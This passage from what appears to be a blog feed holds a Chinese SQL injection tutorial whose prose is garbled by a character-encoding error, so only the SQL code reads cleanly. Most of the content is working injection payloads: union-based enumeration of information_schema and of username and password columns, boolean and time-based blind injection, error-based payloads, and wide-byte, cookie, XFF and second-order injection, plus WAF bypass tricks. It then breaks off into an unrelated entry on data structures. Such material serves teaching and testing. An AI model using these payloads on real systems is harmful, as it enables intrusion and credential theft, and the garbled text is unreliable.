ä¸­çš„è¡¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿™ä¸ªè¡¨æ˜¯åŸºæœ¬è¡¨è¿˜æ˜¯ç³»ç»Ÿè¡¨ï¼Œæ•°æ®åº“çš„å¼•æ“æ˜¯ä»€ä¹ˆï¼Œè¡¨æœ‰å¤šå°‘è¡Œï¼Œåˆ›å»ºæ—¶é—´ï¼Œæœ€åæ›´æ–°æ—¶é—´ç­‰</p><p><strong><code>COLUMNS</code></strong></p><p>å‚¨å­˜ mysql ä¸­è¡¨çš„åˆ—ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿™ä¸ªè¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ï¼Œè¯¥åˆ—æ˜¯è¡¨ä¸­çš„ç¬¬å‡ åˆ—ï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œåˆ—çš„ç¼–ç ç±»å‹ï¼Œåˆ—çš„æƒé™ï¼Œåˆ—çš„æ³¨é‡Šç­‰</p><h1 id="0x05-åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹"><a href="#0x05-åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹" class="headerlink" title="0x05 åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹"></a>0x05 åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹</h1><p>è¦ä» select è¯­å¥ä¸­è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¿…é¡»ç¡®å®šè¯¥æ•°æ®åº“ä¸­çš„å­—æ®µæ•°å’Œé‚£ä¸ªå­—æ®µèƒ½å¤Ÿè¾“å‡ºï¼Œè¿™æ˜¯å‰æã€‚</p><h2 id="1-MySQL-gt-x3D-5-0"><a href="#1-MySQL-gt-x3D-5-0" class="headerlink" title="1. MySQL &gt;&#x3D; 5.0"></a>1. MySQL &gt;&#x3D; 5.0</h2><h2 id="ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°"><a href="#ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°" class="headerlink" title="ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°"></a>ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n  <span class="comment">/*é€šè¿‡ä¸æ–­å°è¯•æ”¹å˜nçš„å€¼æ¥è§‚å¯Ÿé¡µé¢ååº”ç¡®å®šå­—æ®µæ•°*/</span></span><br></pre></td></tr></table></figure><h2 id="ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å"><a href="#ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å" class="headerlink" title="ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å"></a>ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å</h2><p>åœ¨MySQL &gt;5.0ä¸­ï¼Œæ•°æ®åº“åå­˜æ”¾åœ¨<code>information_schema</code>æ•°æ®åº“ä¸‹<code>schemata</code>è¡¨<code>schema_name</code>å­—æ®µä¸­</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><h2 id="ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å"><a href="#ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å" class="headerlink" title="ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å"></a>ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,database()</span><br></pre></td></tr></table></figure><h2 id="ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨"><a href="#ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨" class="headerlink" title="ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨"></a>ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ"><a href="#ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ" class="headerlink" title="ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ"></a>ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ</h2><p>è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸º user </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼"><a href="#ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼" class="headerlink" title="ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼"></a>ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼</h2><p>è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸º userï¼Œä¸”å­—æ®µä¸º username å’Œ password </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure><h2 id="2-MySQL-lt-5-0"><a href="#2-MySQL-lt-5-0" class="headerlink" title="2.MySQL &lt; 5.0"></a>2.MySQL &lt; 5.0</h2><p>MySQL &lt; 5.0 æ²¡æœ‰ä¿¡æ¯æ•°æ®åº“**<code>information_schema</code>**ï¼Œæ‰€ä»¥åªèƒ½æ‰‹å·¥æšä¸¾çˆ†ç ´ï¼ˆäºŒåˆ†æ³•æ€æƒ³ï¼‰ã€‚</p><p>è¯¥æ–¹å¼é€šå¸¸ç”¨äºç›²æ³¨ã€‚</p><h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><p><strong>length(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸² str çš„é•¿åº¦</p><p><strong>substr(str, pos, len)</strong> ï¼šå°† str ä» pos ä½ç½®å¼€å§‹æˆªå– len é•¿åº¦çš„å­—ç¬¦è¿›è¡Œè¿”å›ã€‚æ³¨æ„è¿™é‡Œçš„ pos ä½ç½®æ˜¯ä» 1 å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„ 0 å¼€å§‹</p><p><strong>mid(str,pos,len)</strong> ï¼šè·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸²</p><p><strong>ascii(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸² str çš„æœ€å·¦é¢å­—ç¬¦çš„ ASCII ä»£ç å€¼</p><p><strong>ord(str)</strong> ï¼šå°†å­—ç¬¦æˆ–å¸ƒå°”ç±»å‹è½¬æˆ ascll ç </p><p><strong>if(a,b,c)</strong> ï¼ša ä¸ºæ¡ä»¶ï¼Œa ä¸º trueï¼Œè¿”å› bï¼Œå¦åˆ™è¿”å› cï¼Œå¦‚ if(1&gt;2,1,0) ,è¿”å› 0</p><h2 id="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨"><a href="#ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨" class="headerlink" title="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨"></a>ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span> <span class="comment">/*åˆ¤æ–­æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiå€¼æ˜¯å¦å¤§äº64*/</span></span><br></pre></td></tr></table></figure><h2 id="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨"><a href="#ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨" class="headerlink" title="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨"></a>ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> if(<span class="built_in">SUBSTRING</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;root&#x27;</span>,sleep(<span class="number">4</span>),<span class="number">1</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="comment">/*æå–ç”¨æˆ·åå‰å››ä¸ªå­—ç¬¦åšåˆ¤æ–­ï¼Œæ­£ç¡®å°±å»¶è¿Ÿ4ç§’ï¼Œé”™è¯¯è¿”å›1*/</span></span><br></pre></td></tr></table></figure><h1 id="0x06-å¸¸ç”¨æ³¨å…¥æ–¹å¼"><a href="#0x06-å¸¸ç”¨æ³¨å…¥æ–¹å¼" class="headerlink" title="0x06 å¸¸ç”¨æ³¨å…¥æ–¹å¼"></a>0x06 å¸¸ç”¨æ³¨å…¥æ–¹å¼</h1><p>æ³¨é‡Šç¬¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"><span class="comment">-- (æœ‰ç©ºæ ¼)æˆ–--+</span></span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure><p>å†…è”æ³¨é‡Šï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ï¼...*/</span></span><br></pre></td></tr></table></figure><h2 id="unionæ³¨å…¥"><a href="#unionæ³¨å…¥" class="headerlink" title="unionæ³¨å…¥"></a>unionæ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>   <span class="comment">/*è·å–å­—æ®µ*/</span></span><br></pre></td></tr></table></figure><h2 id="Booleanæ³¨å…¥"><a href="#Booleanæ³¨å…¥" class="headerlink" title="Booleanæ³¨å…¥"></a>Booleanæ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;--+     /*åˆ¤æ–­æ•°æ®åé•¿åº¦*/</span></span><br></pre></td></tr></table></figure><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><h3 id="1-floor-å’Œrand"><a href="#1-floor-å’Œrand" class="headerlink" title="1 floor()å’Œrand()"></a>1 floor()å’Œrand()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="number">2</span>,concat(<span class="string">&#x27;:&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;:&#x27;</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a       <span class="comment">/*åˆ©ç”¨é”™è¯¯ä¿¡æ¯å¾—åˆ°å½“å‰æ•°æ®åº“å*/</span></span><br></pre></td></tr></table></figure><h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2 extractvalue()"></a>2 extractvalue()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure><h3 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3 updatexml()"></a>3 updatexml()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4 geometrycollection()"></a>4 geometrycollection()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5 multipoint()"></a>5 multipoint()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6 polygon()"></a>6 polygon()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7 multipolygon()"></a>7 multipolygon()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8 linestring()"></a>8 linestring()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9 multilinestring()"></a>9 multilinestring()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h3 id="10-exp"><a href="#10-exp" class="headerlink" title="10 exp()"></a>10 exp()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><h2 id="æ—¶é—´æ³¨å…¥"><a href="#æ—¶é—´æ³¨å…¥" class="headerlink" title="æ—¶é—´æ³¨å…¥"></a>æ—¶é—´æ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="å †å æŸ¥è¯¢æ³¨å…¥"><a href="#å †å æŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å †å æŸ¥è¯¢æ³¨å…¥"></a>å †å æŸ¥è¯¢æ³¨å…¥</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;;select if(sub(user(),1,1)=&#x27;</span>r<span class="string">&#x27;,sleep(3),1)%23</span></span><br></pre></td></tr></table></figure><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p>å‡å¦‚åœ¨å¦‚ä¸‹åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬æµè§ˆä¸€äº›ç½‘ç«™çš„æ—¶å€™ï¼Œå¯ä»¥ç°åœ¨æ³¨å†Œè§é¡µé¢æ³¨å†Œ username&#x3D;testâ€™ ï¼Œæ¥ä¸‹æ¥è®¿é—® xxx.php?username&#x3D;testâ€™ ï¼Œé¡µé¢è¿”å› id&#x3D;22 ï¼›</p><p>æ¥ä¸‹æ¥å†æ¬¡å‘èµ·è¯·æ±‚ xxx.php?id&#x3D;22 ï¼Œè¿™æ—¶å€™å°±æœ‰å¯èƒ½å‘ç”Ÿ sql æ³¨å…¥ï¼Œæ¯”å¦‚é¡µé¢ä¼šè¿”å› MySQL çš„é”™è¯¯ã€‚</p><p>è®¿é—® xxx.php?id&#x3D;testâ€™ union select 1,user(),3%23 ï¼Œè·å¾—æ–°çš„ id&#x3D;40 ï¼Œå¾—åˆ° user() çš„ç»“æœï¼Œåˆ©ç”¨è¿™ç§æ³¨å…¥æ–¹å¼ä¼šå¾—åˆ°æ•°æ®åº“ä¸­çš„å€¼ã€‚</p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><h3 id="åˆ©ç”¨æ¡ä»¶ï¼š"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h3><ul><li><input checked="" disabled="" type="checkbox"> æŸ¥è¯¢å‚æ•°æ˜¯è¢«å•å¼•å·åŒ…å›´çš„ï¼Œä¼ å…¥çš„å•å¼•å·åˆè¢«è½¬ä¹‰ç¬¦()è½¬ä¹‰ï¼Œå¦‚åœ¨åå°æ•°æ®åº“ä¸­å¯¹æ¥å—çš„å‚æ•°ä½¿ç”¨ addslashes() æˆ–å…¶è¿‡æ»¤å‡½æ•°</li><li><input checked="" disabled="" type="checkbox"> æ•°æ®åº“çš„ç¼–ç ä¸º GBK</li></ul><h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">-1</span><span class="operator">%</span>DF<span class="string">&#x27; union select 1,user(),3,%23</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°æ¡ä»¶ä¸‹ï¼Œå•å¼•å·<code>&#39;</code>è¢«è½¬ä¹‰ä¸º <code>%5c</code> ï¼Œæ‰€ä»¥å°±æ„æˆäº† <code>%df%5c</code> ï¼Œè€Œåœ¨GBKç¼–ç æ–¹å¼ä¸‹ï¼Œ<code>%df%5c</code>æ˜¯ä¸€ä¸ªç¹ä½“å­—â€œé€£â€ï¼Œæ‰€ä»¥å•å¼•å·æˆåŠŸé€ƒé€¸ã€‚</p><h2 id="Cookieæ³¨å…¥"><a href="#Cookieæ³¨å…¥" class="headerlink" title="Cookieæ³¨å…¥"></a>Cookieæ³¨å…¥</h2><p>å½“å‘ç°åœ¨ url ä¸­æ²¡æœ‰è¯·æ±‚å‚æ•°ï¼Œå•æ•°å´èƒ½å¾—åˆ°ç»“æœçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹çœ‹è¯·æ±‚å‚æ•°æ˜¯ä¸æ˜¯åœ¨ cookie ä¸­ï¼Œç„¶ååˆ©ç”¨å¸¸è§„æ³¨å…¥æ–¹å¼åœ¨ cookie ä¸­æ³¨å…¥æµ‹è¯•å³å¯ï¼Œåªæ˜¯æ³¨å…¥çš„ä½ç½®åœ¨ cookie ä¸­ï¼Œä¸ url ä¸­çš„æ³¨å…¥æ²¡æœ‰åŒºåˆ«ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="base64æ³¨å…¥"><a href="#base64æ³¨å…¥" class="headerlink" title="base64æ³¨å…¥"></a>base64æ³¨å…¥</h2><p>å¯¹å‚æ•°è¿›è¡Œ base64 ç¼–ç ï¼Œå†å‘é€è¯·æ±‚ã€‚</p><p>è¯´æ˜ï¼šid&#x3D;1â€™ï¼Œ1çš„base64ç¼–ç ä¸º<code>MSc=</code>ï¼Œè€Œ<code>=</code>çš„ url ç¼–ç ä¸º<code>%3d</code>ï¼Œæ‰€ä»¥å¾—åˆ°ä»¥ä¸‹ç»“æœï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span>MSc<span class="operator">%</span><span class="number">3</span>d</span><br></pre></td></tr></table></figure><h2 id="XFFæ³¨å…¥"><a href="#XFFæ³¨å…¥" class="headerlink" title="XFFæ³¨å…¥"></a>XFFæ³¨å…¥</h2><p>XFF(X-Forward-For)ï¼Œç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯çœŸå®çš„ ip åœ°å€</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X<span class="operator">-</span>Forward<span class="operator">-</span><span class="keyword">For</span>ï¼š<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#x27; select 1,2,user()</span></span><br></pre></td></tr></table></figure><h1 id="0x07-SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯"><a href="#0x07-SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯" class="headerlink" title="0x07 SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯"></a>0x07 SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯</h1><ul><li><p><strong>å¤§å°å†™ç»•è¿‡</strong></p></li><li><p><strong>åŒå†™ç»•è¿‡</strong></p></li><li><p><strong>ç¼–ç ç»•è¿‡</strong>ï¼ˆurlå…¨ç¼–ç ã€åå…­è¿›åˆ¶ï¼‰</p></li><li><p><strong>å†…è”æ³¨é‡Šç»•è¿‡</strong></p></li><li><p><strong>å…³é”®å­—æ›¿æ¢</strong></p><ul><li><p><strong>é€—å·ç»•è¿‡</strong></p><p>substrã€mid()å‡½æ•°ä¸­å¯ä»¥åˆ©ç”¨from toæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨ï¼›</p><p>limitä¸­å¯ä»¥åˆ©ç”¨offsetæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨</p></li><li><p><strong>æ¯”è¾ƒç¬¦å·( &gt;ã€&lt; )ç»•è¿‡</strong>ï¼ˆgreatestã€between and)</p></li><li><p><strong>é€»è¾‘ç¬¦å·çš„æ›¿æ¢</strong>ï¼ˆand&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!ï¼‰</p></li><li><p><strong>ç©ºæ ¼ç»•è¿‡</strong>ï¼ˆç”¨æ‹¬å·ï¼Œ+ç­‰ç»•è¿‡ï¼‰</p></li></ul></li><li><p><strong>ç­‰ä»·å‡½æ•°ç»•è¿‡</strong></p><ul><li>hex()ã€bin()&#x3D;ascii()</li><li>concat_ws()&#x3D;group_concat()</li><li>mid()ã€substr()&#x3D;substring()</li></ul></li><li><p><strong>httpå‚æ•°æ±¡æŸ“</strong>ï¼ˆ<code>id=1 union select+1,2,3+from+users+where+id=1â€“</code>å˜ä¸º<code>id=1 union select+1&amp;id=2,3+from+users+where+id=1â€“</code>ï¼‰</p></li><li><p><strong>ç¼“å†²åŒºæº¢å‡ºç»•è¿‡</strong> (id&#x3D;1 and (select 1)&#x3D;(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36â€“+ å…¶ä¸­0xAAAAAAAAAAAAAAAAAAAAAè¿™é‡ŒAè¶Šå¤šè¶Šå¥½ã€‚ã€‚ä¸€èˆ¬ä¼šå­˜åœ¨ä¸´ç•Œå€¼ï¼Œå…¶å®è¿™ç§æ–¹æ³•è¿˜å¯¹åç¼€åçš„ç»•è¿‡ä¹Ÿæœ‰ç”¨)</p></li></ul><blockquote><p>æœªå®Œå¾…ç»­</p><p>æœ‰é‡åˆ°SQLæ³¨å…¥çš„å¥‡æŠ€æ·«å·§éšæ—¶æ›´æ–°</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®ç»“æ„ç¬”è®°ï¼ˆæ¡‚ç”µæ•™æç‰ˆæœ¬ï¼‰</title>
      <link href="/posts/24342/"/>
      <url>/posts/24342/</url>
      
